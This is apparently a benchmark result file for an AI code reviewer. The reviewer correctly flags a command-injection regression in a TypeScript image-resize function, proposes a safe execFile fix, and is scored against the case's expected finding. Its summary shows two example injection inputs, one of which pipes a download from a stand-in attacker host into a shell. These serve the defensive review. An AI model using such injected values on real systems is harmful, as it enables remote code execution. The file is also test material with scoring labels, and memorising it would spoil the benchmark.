@@ -1,0 +1,108 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "0c26652cd134",
+  "turns": 5,
+  "tool_calls": null,
+  "seconds": 59.2,
+  "setup_seconds": 0.1,
+  "total_seconds": 59.3,
+  "usage": {
+    "in": 18808,
+    "cache_read": 133120,
+    "cache_write": 0,
+    "out": 3597,
+    "source": "cli"
+  },
+  "cost_usd": 0.099134,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "Switching from `execFile` (argv array, no shell) to `exec` with a template string lets attacker-controlled `src` / `filter` run arbitrary shell commands. `filter` is unquoted; `src` is only double-quoted, so `\\\"`, `$()`, and backticks still break out.\n\nImageMagick `-filter` is a normal CLI argument \u2014 no shell is required. Restore `execFile` and pass the filter as its own argv element:\n\n```suggestion\nimport { execFile } from \"child_process\";\n\nexport function resize(src: string, filter: string, w: number): Promise<string> {\n  return new Promise((res, rej) => {\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n  });\n}\n```\n\nAlso validate `filter` against an allowlist of known ImageMagick filter names if the input is user-facing."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity": "warning",
+      "body": "`resize(src, w)` becomes `resize(src, filter, w)`. Existing callers that still pass `(src, w)` will bind the width number to `filter` and leave `w` as `undefined`, producing a broken `-resize undefinedx` invocation (or worse once coerced in the shell string).\n\nIf a filter parameter is intentional, add it as an optional last argument with a safe default (e.g. `filter = \"Lanczos\"`), or bump the major version and update all call sites in the same change."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a critical command-injection vulnerability by replacing `execFile` (argv, no shell) with `exec` (shell) and interpolating caller-controlled `src`, `filter`, and `w` into the command string.\n\n## Analysis\n\n`child_process.exec` runs the string through a shell. Any metacharacters in `filter` (unquoted) or `src` (only double-quoted) can break out and run arbitrary commands on the host, for example:\n\n- `filter`: `Lanczos; curl attacker.test/exfil | sh`\n- `src`: `image.png\\\"; id > /tmp/pwned; echo \\\"`\n\nThe comment claims a shell is required for user-composed `-filter` expressions. ImageMagick accepts the filter as a normal argv token; `execFile` with a separate `-filter` argument is sufficient and keeps the process out of the shell.\n\nThe new required `filter` parameter also changes the public signature of `resize` mid-list (`src, w` \u2192 `src, filter, w`), which is a breaking API change for any existing callers.\n\n## Release decision\n\n**Recommendation:** request-changes\n",
+  "round": "full",
+  "effective_max_turns": 30,
+  "budget": {
+    "tier": "standard",
+    "profile": "fixed",
+    "turns": 30,
+    "alias": "balanced",
+    "model": "grok-4.5",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 30,
+    "patch_bytes": 120000,
+    "native_cap_applied": false
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The patch replaces safe `execFile` argv passing with `exec` and a template that interpolates unquoted `filter` and only double-quoted `src`, enabling shell metacharacter breakout. ImageMagick `-filter` does not require a shell, so this is a real critical command-injection regression."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "not sampled"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 11.185,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2944,
+      "out": 425
+    },
+    "cost_usd": 0.009334
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
